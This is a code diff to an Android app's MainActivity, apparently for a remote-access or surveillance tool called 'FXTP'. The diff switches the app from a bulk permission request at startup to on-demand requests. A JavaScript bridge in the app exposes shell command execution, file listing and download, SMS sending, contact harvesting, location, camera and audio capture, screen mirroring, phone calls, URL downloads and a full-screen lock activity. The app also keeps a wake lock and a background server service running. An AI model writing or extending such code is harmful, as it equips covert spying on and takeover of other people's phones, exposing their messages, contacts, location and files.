@@ -40,9 +40,6 @@ import android.webkit.WebChromeClient;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.widget.Button;
-import android.widget.LinearLayout;
-import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
@@ -72,9 +69,6 @@ import java.util.List;
 public class MainActivity extends AppCompatActivity {
 
     private WebView webView;
-    private LinearLayout splashLayout;
-    private Button btnStart;
-    private TextView permStatus;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
     private MediaRecorder audioRecorder;
     private String audioFilePath;
@@ -84,44 +78,23 @@ public class MainActivity extends AppCompatActivity {
     private boolean isRecording = false;
     private PowerManager.WakeLock wakeLock;
 
-    private String[] allPerms = {
-            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            android.Manifest.permission.READ_EXTERNAL_STORAGE,
-            android.Manifest.permission.CAMERA,
-            android.Manifest.permission.RECORD_AUDIO,
-            android.Manifest.permission.ACCESS_FINE_LOCATION,
-            android.Manifest.permission.ACCESS_COARSE_LOCATION,
-            android.Manifest.permission.READ_SMS,
-            android.Manifest.permission.SEND_SMS,
-            android.Manifest.permission.READ_CONTACTS,
-            android.Manifest.permission.CALL_PHONE,
-            android.Manifest.permission.ACCESS_WIFI_STATE,
-            android.Manifest.permission.CHANGE_WIFI_STATE,
-            android.Manifest.permission.SYSTEM_ALERT_WINDOW,
-            android.Manifest.permission.VIBRATE,
-            android.Manifest.permission.WRITE_SETTINGS,
-            android.Manifest.permission.READ_PHONE_STATE,
-            android.Manifest.permission.FOREGROUND_SERVICE,
-            android.Manifest.permission.WAKE_LOCK
-    };
-    private int permIndex = 0;
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        webView = findViewById(R.id.webView);
-        splashLayout = findViewById(R.id.splashLayout);
-        btnStart = findViewById(R.id.btnStart);
-        permStatus = findViewById(R.id.permStatus);
-
+        // Wake lock – keep screen on (no permission needed)
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
         if (pm != null) {
             wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "FXTP:WakeLock");
-            wakeLock.acquire(10*60*1000L);
+            wakeLock.acquire(10 * 60 * 1000L);
         }
 
+        // WebView – load immediately
+        webView = findViewById(R.id.webView);
+        setupWebView();
+
+        // Camera manager (for flashlight)
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
         try {
             for (String id : cameraManager.getCameraIdList()) {
@@ -135,126 +108,57 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
 
-        btnStart.setOnClickListener(v -> {
-            permIndex = 0;
-            requestNextPermission();
-        });
-    }
-
-    private void requestNextPermission() {
-        if (permIndex >= allPerms.length) {
-            permStatus.setText("✅ All permissions granted");
-            // Delay to let UI settle, then start app
-            mainHandler.postDelayed(this::startApp, 500);
-            return;
-        }
-        String perm = allPerms[permIndex];
-        if (perm.equals(android.Manifest.permission.SYSTEM_ALERT_WINDOW)) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, 1002);
-                return;
-            } else {
-                permIndex++;
-                requestNextPermission();
-                return;
-            }
-        } else if (perm.equals(android.Manifest.permission.WRITE_SETTINGS)) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
-                intent.setData(Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, 1003);
-                return;
-            } else {
-                permIndex++;
-                requestNextPermission();
-                return;
-            }
-        } else {
-            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-                permStatus.setText("Requesting: " + perm.substring(perm.lastIndexOf('.')+1));
-                ActivityCompat.requestPermissions(this, new String[]{perm}, 1001 + permIndex);
-            } else {
-                permIndex++;
-                requestNextPermission();
-            }
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode >= 1001 && requestCode < 1001 + allPerms.length) {
-            int idx = requestCode - 1001;
-            if (idx < allPerms.length) {
-                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    permStatus.setText("✅ " + allPerms[idx].substring(allPerms[idx].lastIndexOf('.')+1) + " granted");
-                } else {
-                    permStatus.setText("⚠️ " + allPerms[idx].substring(allPerms[idx].lastIndexOf('.')+1) + " denied");
-                    Toast.makeText(this, "Permission denied: " + allPerms[idx], Toast.LENGTH_SHORT).show();
-                }
-                permIndex++;
-                mainHandler.postDelayed(this::requestNextPermission, 300);
-            }
-        }
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == 1002) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
-                permStatus.setText("✅ Overlay granted");
-            } else {
-                permStatus.setText("⚠️ Overlay denied");
-            }
-            permIndex++;
-            requestNextPermission();
-        } else if (requestCode == 1003) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.System.canWrite(this)) {
-                permStatus.setText("✅ Write settings granted");
-            } else {
-                permStatus.setText("⚠️ Write settings denied");
-            }
-            permIndex++;
-            requestNextPermission();
-        } else if (requestCode == 200 && resultCode == RESULT_OK) {
-            Bitmap bitmap = (Bitmap) data.getExtras().get("data");
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
-            String base64 = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
-            webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('camera_data', '" + base64 + "');");
-        }
-    }
-
-    private void startApp() {
-        splashLayout.setVisibility(View.GONE);
-        webView.setVisibility(View.VISIBLE);
-
-        // Setup WebView with try-catch
-        try {
-            WebSettings settings = webView.getSettings();
-            settings.setJavaScriptEnabled(true);
-            settings.setDomStorageEnabled(true);
-            settings.setAllowFileAccess(true);
-            settings.setAllowContentAccess(true);
-            settings.setMediaPlaybackRequiresUserGesture(false);
-            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
-            webView.setWebChromeClient(new WebChromeClient());
-            webView.setWebViewClient(new WebViewClient());
-            webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
-            webView.loadUrl("file:///android_asset/device.html");
-        } catch (Exception e) {
-            Log.e("FXTP", "WebView error", e);
-            Toast.makeText(this, "WebView error: " + e.getMessage(), Toast.LENGTH_LONG).show();
-        }
-
+        // Start foreground service (safe – no crash if missing)
         try {
             startForegroundService(new Intent(this, ServerService.class));
         } catch (Exception e) {
             Log.e("FXTP", "Service start failed", e);
         }
+
+        Log.d("FXTP", "App started – on‑demand permissions");
+    }
+
+    private void setupWebView() {
+        WebSettings settings = webView.getSettings();
+        settings.setJavaScriptEnabled(true);
+        settings.setDomStorageEnabled(true);
+        settings.setAllowFileAccess(true);
+        settings.setAllowContentAccess(true);
+        settings.setMediaPlaybackRequiresUserGesture(false);
+        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+        webView.setWebChromeClient(new WebChromeClient());
+        webView.setWebViewClient(new WebViewClient());
+        webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
+        webView.loadUrl("file:///android_asset/device.html");
+    }
+
+    // ==================== PERMISSION HELPERS ====================
+    private boolean hasPermission(String perm) {
+        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private void requestPermission(String perm, int reqCode) {
+        ActivityCompat.requestPermissions(this, new String[]{perm}, reqCode);
+    }
+
+    private boolean hasOverlayPermission() {
+        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
+    }
+
+    private void requestOverlayPermission() {
+        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:" + getPackageName()));
+        startActivityForResult(intent, 1002);
+    }
+
+    private boolean hasWriteSettingsPermission() {
+        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.System.canWrite(this);
+    }
+
+    private void requestWriteSettingsPermission() {
+        Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
+        intent.setData(Uri.parse("package:" + getPackageName()));
+        startActivityForResult(intent, 1003);
     }
 
     // ==================== ANDROID BRIDGE ====================
@@ -270,6 +174,7 @@ public class MainActivity extends AppCompatActivity {
             return "pong";
         }
 
+        // --- Screenshot (no permission needed) ---
         @JavascriptInterface
         public String takeScreenshot() {
             try {
@@ -287,6 +192,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Mirror ---
         @JavascriptInterface
         public String startMirror() {
             if (isMirroring) return "Already mirroring";
@@ -319,6 +225,7 @@ public class MainActivity extends AppCompatActivity {
             return "Mirror stopped";
         }
 
+        // --- Shell (no permission) ---
         @JavascriptInterface
         public String runShell(String cmd) {
             try {
@@ -334,6 +241,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Launch App (no permission) ---
         @JavascriptInterface
         public String launchApp(String pkg) {
             try {
@@ -356,11 +264,19 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- File Manager (no permission for reading internal, but external needs permission) ---
         @JavascriptInterface
         public String listFiles(String path) {
             try {
                 File dir = new File(path);
                 if (!dir.exists()) return "Path not found: " + path;
+                // If path is external and permission missing, return error
+                if (path.startsWith("/sdcard") || path.startsWith("/storage/emulated")) {
+                    if (!hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
+                        requestPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE, 2001);
+                        return "READ_EXTERNAL_STORAGE permission needed";
+                    }
+                }
                 File[] files = dir.listFiles();
                 JSONArray arr = new JSONArray();
                 if (files != null) {
@@ -381,6 +297,12 @@ public class MainActivity extends AppCompatActivity {
         @JavascriptInterface
         public String downloadFile(String path) {
             try {
+                if (path.startsWith("/sdcard") || path.startsWith("/storage/emulated")) {
+                    if (!hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
+                        requestPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE, 2001);
+                        return "READ_EXTERNAL_STORAGE permission needed";
+                    }
+                }
                 File f = new File(path);
                 if (!f.exists()) return "File not found";
                 FileInputStream fis = new FileInputStream(f);
@@ -393,8 +315,15 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Notification (needs POST_NOTIFICATIONS on Android 13+) ---
         @JavascriptInterface
         public String sendNotification(String msg) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                if (!hasPermission(android.Manifest.permission.POST_NOTIFICATIONS)) {
+                    requestPermission(android.Manifest.permission.POST_NOTIFICATIONS, 2002);
+                    return "POST_NOTIFICATIONS permission needed";
+                }
+            }
             try {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     NotificationChannel ch = new NotificationChannel("fxtp_ch", "FXTP", NotificationManager.IMPORTANCE_HIGH);
@@ -417,6 +346,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Clipboard (no permission needed) ---
         @JavascriptInterface
         public String setClipboard(String text) {
             try {
@@ -444,8 +374,13 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- SMS (needs SEND_SMS and READ_SMS) ---
         @JavascriptInterface
         public String sendSms(String data) {
+            if (!hasPermission(android.Manifest.permission.SEND_SMS)) {
+                requestPermission(android.Manifest.permission.SEND_SMS, 2003);
+                return "SEND_SMS permission needed";
+            }
             try {
                 String[] parts = data.split("\\|");
                 if (parts.length < 2) return "Format: number|message";
@@ -459,8 +394,13 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Contacts (needs READ_CONTACTS) ---
         @JavascriptInterface
         public String getContacts() {
+            if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
+                requestPermission(android.Manifest.permission.READ_CONTACTS, 2004);
+                return "READ_CONTACTS permission needed";
+            }
             try {
                 ContentResolver cr = getContentResolver();
                 Cursor cur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
@@ -482,13 +422,15 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Location (needs ACCESS_FINE_LOCATION) ---
         @JavascriptInterface
         public String getLocation() {
+            if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
+                requestPermission(android.Manifest.permission.ACCESS_FINE_LOCATION, 2005);
+                return "ACCESS_FINE_LOCATION permission needed";
+            }
             try {
                 android.location.LocationManager lm = (android.location.LocationManager) getSystemService(Context.LOCATION_SERVICE);
-                if (ActivityCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                    return "Location permission not granted";
-                }
                 Location loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                 if (loc == null) loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
                 if (loc != null) {
@@ -505,8 +447,13 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Camera (needs CAMERA) ---
         @JavascriptInterface
         public String captureCamera() {
+            if (!hasPermission(android.Manifest.permission.CAMERA)) {
+                requestPermission(android.Manifest.permission.CAMERA, 2006);
+                return "CAMERA permission needed";
+            }
             try {
                 Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                 startActivityForResult(intent, 200);
@@ -516,12 +463,14 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Audio (needs RECORD_AUDIO) ---
         @JavascriptInterface
         public String startAudioRecording(int duration) {
-            if (isRecording) return "Already recording";
-            if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                return "Record audio permission not granted";
+            if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
+                requestPermission(android.Manifest.permission.RECORD_AUDIO, 2007);
+                return "RECORD_AUDIO permission needed";
             }
+            if (isRecording) return "Already recording";
             try {
                 audioFilePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
                 audioRecorder = new MediaRecorder();
@@ -564,6 +513,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Device Info (no permission) ---
         @JavascriptInterface
         public String getDeviceInfo() {
             try {
@@ -622,6 +572,7 @@ public class MainActivity extends AppCompatActivity {
             return "unknown";
         }
 
+        // --- Packages (no permission) ---
         @JavascriptInterface
         public String getPackages() {
             try {
@@ -636,8 +587,13 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- WiFi (needs ACCESS_WIFI_STATE) ---
         @JavascriptInterface
         public String scanWifi() {
+            if (!hasPermission(android.Manifest.permission.ACCESS_WIFI_STATE)) {
+                requestPermission(android.Manifest.permission.ACCESS_WIFI_STATE, 2008);
+                return "ACCESS_WIFI_STATE permission needed";
+            }
             try {
                 WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                 if (wm != null) {
@@ -658,8 +614,13 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Flashlight (needs CAMERA) ---
         @JavascriptInterface
         public String toggleFlashlight(boolean on) {
+            if (!hasPermission(android.Manifest.permission.CAMERA)) {
+                requestPermission(android.Manifest.permission.CAMERA, 2006);
+                return "CAMERA permission needed";
+            }
             try {
                 cameraManager.setTorchMode(cameraId, on);
                 return on ? "ON" : "OFF";
@@ -668,10 +629,12 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Vibrate (needs VIBRATE) ---
         @JavascriptInterface
         public String vibrate(int duration) {
-            if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.VIBRATE) != PackageManager.PERMISSION_GRANTED) {
-                return "Vibrate permission not granted";
+            if (!hasPermission(android.Manifest.permission.VIBRATE)) {
+                requestPermission(android.Manifest.permission.VIBRATE, 2009);
+                return "VIBRATE permission needed";
             }
             try {
                 Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
@@ -685,17 +648,14 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Brightness (needs WRITE_SETTINGS) ---
         @JavascriptInterface
         public String setBrightness(int value) {
+            if (!hasWriteSettingsPermission()) {
+                requestWriteSettingsPermission();
+                return "WRITE_SETTINGS permission needed – grant it in the system dialog";
+            }
             try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    if (!Settings.System.canWrite(MainActivity.this)) {
-                        Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
-                        intent.setData(Uri.parse("package:" + getPackageName()));
-                        startActivity(intent);
-                        return "Please grant write settings permission to change brightness";
-                    }
-                }
                 int brightness = Math.max(0, Math.min(255, value * 255 / 100));
                 Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, brightness);
                 return "Brightness set to " + value + "%";
@@ -704,6 +664,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Volume (no permission) ---
         @JavascriptInterface
         public String setVolume(int value) {
             try {
@@ -719,6 +680,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Download from URL (no permission) ---
         @JavascriptInterface
         public String downloadFromUrl(String urlStr) {
             try {
@@ -741,22 +703,24 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // --- Call (needs CALL_PHONE) ---
         @JavascriptInterface
         public String makeCall(String number) {
+            if (!hasPermission(android.Manifest.permission.CALL_PHONE)) {
+                requestPermission(android.Manifest.permission.CALL_PHONE, 2010);
+                return "CALL_PHONE permission needed";
+            }
             try {
                 Intent intent = new Intent(Intent.ACTION_CALL);
                 intent.setData(Uri.parse("tel:" + number));
-                if (ActivityCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
-                    startActivity(intent);
-                    return "Calling " + number;
-                } else {
-                    return "Call permission not granted";
-                }
+                startActivity(intent);
+                return "Calling " + number;
             } catch (Exception e) {
                 return "ERROR: " + e.getMessage();
             }
         }
 
+        // --- Lock Screen (no permission) ---
         @JavascriptInterface
         public String startLockScreen() {
             Intent lockIntent = new Intent(MainActivity.this, LockActivity.class);
@@ -765,6 +729,7 @@ public class MainActivity extends AppCompatActivity {
             return "Lock screen activated";
         }
 
+        // --- Display HTML (no permission) ---
         @JavascriptInterface
         public String displayHtml(String html) {
             Intent intent = new Intent(MainActivity.this, LockActivity.class);
@@ -772,6 +737,42 @@ public class MainActivity extends AppCompatActivity {
             intent.putExtra("display_html", true);
             startActivity(intent);
             return "HTML displayed";
+        }
+    }
+
+    // ==================== PERMISSION RESULTS ====================
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        // Toast the result so the user knows
+        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            Toast.makeText(this, "Permission granted: " + permissions[0], Toast.LENGTH_SHORT).show();
+        } else {
+            Toast.makeText(this, "Permission denied: " + permissions[0] + " – feature may not work", Toast.LENGTH_LONG).show();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1002) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
+                Toast.makeText(this, "Overlay permission granted", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "Overlay permission denied – mirror may not work", Toast.LENGTH_LONG).show();
+            }
+        } else if (requestCode == 1003) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.System.canWrite(this)) {
+                Toast.makeText(this, "Write settings granted", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "Write settings denied – brightness may not work", Toast.LENGTH_LONG).show();
+            }
+        } else if (requestCode == 200 && resultCode == RESULT_OK) {
+            Bitmap bitmap = (Bitmap) data.getExtras().get("data");
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
+            String base64 = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
+            webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('camera_data', '" + base64 + "');");
         }
     }
 
@@ -785,4 +786,4 @@ public class MainActivity extends AppCompatActivity {
             audioRecorder = null;
         }
     }
-                }
+                        }
